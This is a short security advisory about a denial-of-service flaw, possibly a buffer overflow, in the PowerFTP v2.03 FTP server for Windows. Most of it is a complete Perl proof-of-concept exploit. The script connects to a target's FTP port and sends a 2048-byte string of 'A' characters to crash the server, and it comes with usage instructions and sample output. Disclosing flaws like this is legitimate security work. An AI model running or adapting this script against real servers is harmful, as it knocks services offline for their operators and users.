source: http://www.securityfocus.com/bid/3595/info


PowerFTP is a commercial FTP server for Microsoft Windows 9x/ME/NT/2000/XP operating systems. It is maintained by Cooolsoft.

Multiple instances of denial of service vulnerabilities exist in PowerFTP's FTP daemon. This is achieved by connecting to a vulnerable host and submitting an unusally long string of arbitrary characters.

It has been reported that this issue may also be triggered by issuing an excessively long FTP command of 2050 bytes or more.

This issue may is most likely due to a buffer overflow. If this is the case, there is a possibility that arbitrary code may be executed on the vulnerable host. However, this has not yet been confirmed. 

#!/usr/bin/perl
# Simple script to send a long 'A^s' command to the server, 
# resulting in the ftpd crashing
#
# PowerFTP Server v2.03 proof-of-concept exploit
# By Alex Hernandez <al3x.hernandez@ureach.com> (C)2001.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
# G.Maggiotti & H.Oliveira.
# 
#
# Usage: perl -x PowerFTP_Dos.pl -s <server>
#
# Example: 
#
# perl -x PowerFTP_Dos.pl -s 10.0.0.1
# 220 Personal FTP Server ready
# Crash was successful !
#

use Getopt::Std;
use IO::Socket;

print("\nPowerFTP server v2.03 DoS exploit (c)2001\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

getopts('s:', \%args);
if(!defined($args{s})){&usage;}
$serv = $args{s};
$foo = "A"; $number = 2048; 
$data .= $foo x $number; $EOL="\015\012";

$remote = IO::Socket::INET->new(
                    Proto => "tcp",
                    PeerAddr => $args{s},
                    PeerPort => "ftp(21)",
                ) || die("Unable to connect to ftp port at $args{s}\n");

$remote->autoflush(1);
print $remote "$data". $EOL;
while (<$remote>){ print }
print("\nCrash was successful !\n");


sub usage {die("\nUsage: $0 -s <server>\n\n");}